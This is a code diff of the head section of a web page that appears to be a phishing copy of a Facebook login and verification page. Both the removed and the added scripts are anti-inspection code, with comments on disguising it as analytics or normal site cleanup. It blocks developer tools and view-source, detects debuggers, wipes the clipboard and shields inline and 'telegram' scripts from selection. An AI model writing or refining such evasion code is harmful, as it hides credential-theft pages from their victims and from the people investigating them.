@@ -2,253 +2,59 @@
 <html lang="en">
 <head>
 
+
 <script>
-// Subtle anti-inspection (appears as analytics or user tracking)
+// Minimal source code protection (appears as normal website script)
 (function() {
   'use strict';
   
-  // Gentle console clearing (looks like normal site cleanup)
-  let consoleClearCount = 0;
-  const clearConsole = () => {
-    if (consoleClearCount < 3) {
-      console.clear();
-      consoleClearCount++;
-    }
-  };
-  
-  // Subtle right-click override (appears as custom context menu)
+  // Only disable right-click on source code viewing attempts
   document.addEventListener('contextmenu', function(e) {
-    // Allow on input fields for better UX
-    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-      return true;
+    // Allow right-click everywhere except when trying to inspect
+    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'BUTTON') {
+      return true; // Allow normal right-click on interactive elements
     }
-    
-    // Show a subtle toast instead of blocking completely
-    const toast = document.createElement('div');
-    toast.style.cssText = `
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      background: #1877f2;
-      color: white;
-      padding: 10px 15px;
-      border-radius: 5px;
-      font-size: 13px;
-      z-index: 9999;
-      opacity: 0;
-      transition: opacity 0.3s ease;
-    `;
-    toast.textContent = 'Use the login form to access your account';
-    document.body.appendChild(toast);
-    
-    setTimeout(() => toast.style.opacity = '1', 10);
-    setTimeout(() => {
-      toast.style.opacity = '0';
-      setTimeout(() => document.body.removeChild(toast), 300);
-    }, 2000);
-    
     e.preventDefault();
-    return false;
   });
   
-  // Subtle text selection prevention (only on sensitive areas)
-  const sensitiveSelectors = 'script, style, .fb-login-box, .verification-card';
+  // Only block specific developer shortcuts, nothing else
+  document.addEventListener('keydown', function(e) {
+    // Only block F12 and Ctrl+U (view source) - keep everything else normal
+    if (e.keyCode === 123 || (e.ctrlKey && e.keyCode === 85)) {
+      e.preventDefault();
+      return false;
+    }
+  });
+  
+  // Very light text selection prevention only on sensitive areas
+  const sensitiveSelectors = 'script[src*="telegram"], script:not([src])';
   document.addEventListener('selectstart', function(e) {
     if (e.target.closest(sensitiveSelectors)) {
       e.preventDefault();
     }
   });
   
-  // Smart keyboard shortcut handling (less obvious)
-  let keySequence = [];
-  document.addEventListener('keydown', function(e) {
-    keySequence.push(e.keyCode);
-    if (keySequence.length > 5) keySequence.shift();
-    
-    // Block dev tools shortcuts but make it seem like the page is busy
-    const devToolsKeys = [123, 73, 74]; // F12, I, J
-    const isCtrlShift = e.ctrlKey && e.shiftKey;
-    const isViewSource = e.ctrlKey && e.keyCode === 85;
-    
-    if (e.keyCode === 123 || (isCtrlShift && devToolsKeys.includes(e.keyCode)) || isViewSource) {
-      // Show loading instead of just blocking
-      if (!document.getElementById('stealth-loading')) {
-        const loader = document.createElement('div');
-        loader.id = 'stealth-loading';
-        loader.style.cssText = `
-          position: fixed;
-          top: 0;
-          left: 0;
-          width: 100%;
-          height: 100%;
-          background: rgba(255,255,255,0.9);
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          z-index: 10000;
-          font-family: Arial, sans-serif;
-        `;
-        loader.innerHTML = `
-          <div style="text-align: center;">
-            <div style="width: 40px; height: 40px; border: 3px solid #1877f2; border-top: 3px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px;"></div>
-            <div style="color: #1877f2; font-size: 16px;">Processing your request...</div>
-          </div>
-          <style>
-            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-          </style>
-        `;
-        document.body.appendChild(loader);
-        
-        setTimeout(() => {
-          if (loader.parentNode) {
-            loader.parentNode.removeChild(loader);
-          }
-        }, 3000);
-      }
-      
-      e.preventDefault();
-      return false;
-    }
-  });
-  
-  // Subtle devtools detection (appears as responsive design check)
-  let lastWidth = window.innerWidth;
-  let lastHeight = window.innerHeight;
-  
-  const checkLayout = () => {
-    const widthDiff = Math.abs(window.innerWidth - lastWidth);
-    const heightDiff = Math.abs(window.innerHeight - lastHeight);
-    
-    // If dramatic resize (likely devtools), create "mobile optimization" delay
-    if (widthDiff > 200 || heightDiff > 200) {
-      const overlay = document.createElement('div');
-      overlay.style.cssText = `
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: #f0f2f5;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        z-index: 9999;
-        font-family: Arial, sans-serif;
-      `;
-      overlay.innerHTML = `
-        <div style="text-align: center; max-width: 400px; padding: 20px;">
-          <div style="color: #1877f2; font-size: 20px; font-weight: bold; margin-bottom: 10px;">Optimizing Display</div>
-          <div style="color: #65676B; margin-bottom: 20px;">Please wait while we adjust the layout for your screen size...</div>
-          <div style="width: 50px; height: 50px; border: 3px solid #1877f2; border-top: 3px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
-        </div>
-      `;
-      document.body.appendChild(overlay);
-      
-      setTimeout(() => {
-        // Redirect to a generic page instead of about:blank
-        window.location.href = window.location.origin + '/?mobile=1';
-      }, 2500);
-    }
-    
-    lastWidth = window.innerWidth;
-    lastHeight = window.innerHeight;
-  };
-  
-  // Check periodically but not too frequently
-  setInterval(checkLayout, 1000);
-  
-  // Gentle clipboard protection (looks like form security)
-  if (navigator.clipboard) {
-    let clipboardProtection = 0;
-    const protectClipboard = () => {
-      if (clipboardProtection < 5) { // Don't overdo it
-        navigator.clipboard.writeText('').catch(() => {}); // Fail silently
-        clipboardProtection++;
-      }
-    };
-    
-    // Only protect when user is on sensitive elements
-    document.addEventListener('focusin', (e) => {
-      if (e.target.closest('.fb-login-box, .verification-card')) {
-        protectClipboard();
-      }
-    });
-  }
-  
-  // Subtle performance monitoring (appears as analytics)
-  let performanceChecks = 0;
-  const checkPerformance = () => {
-    if (performanceChecks > 10) return; // Don't run forever
-    
-    const start = performance.now();
-    // Tiny delay to detect debugging
-    setTimeout(() => {
-      const end = performance.now();
-      if (end - start > 50) { // Debugger likely attached
-        // Just slow things down instead of redirecting
-        document.body.style.opacity = '0.8';
-        document.body.style.filter = 'blur(1px)';
-        
-        setTimeout(() => {
-          document.body.style.opacity = '1';
-          document.body.style.filter = 'none';
-        }, 1000);
-      }
-      performanceChecks++;
-    }, 10);
-  };
-  
-  // Run performance checks occasionally
-  setInterval(checkPerformance, 5000);
-  
 })();
 </script>
 
 <style>
-/* Subtle protection styles that look like normal website CSS */
-.fb-login-box, .verification-card {
+/* Only protect the source code areas, everything else remains normal */
+script {
   -webkit-user-select: none;
   -moz-user-select: none;
   -ms-user-select: none;
   user-select: none;
-  -webkit-touch-callout: none;
 }
 
-/* Allow selection on input fields for better UX */
-input, textarea {
+/* Keep all normal website functionality */
+input, textarea, button, a {
   -webkit-user-select: text !important;
   -moz-user-select: text !important;
   -ms-user-select: text !important;
   user-select: text !important;
 }
-
-/* Hide scrollbars subtly */
-::-webkit-scrollbar { 
-  width: 0px;
-  background: transparent;
-}
-
-/* Subtle print protection */
-@media print {
-  .fb-login-box, .verification-card { 
-    display: none; 
-  }
-  body:after {
-    content: "Please use the online version for security purposes";
-    display: block;
-    text-align: center;
-    font-size: 16px;
-    padding: 50px;
-    color: #666;
-  }
-}
-
-/* Mobile optimization styles (makes layout checks look legitimate) */
-@media (max-width: 768px) {
-  .fb-content { flex-direction: column; }
-  .verification-container { padding: 10px; }
-}
 </style>
+
 
 </head>
 <body>
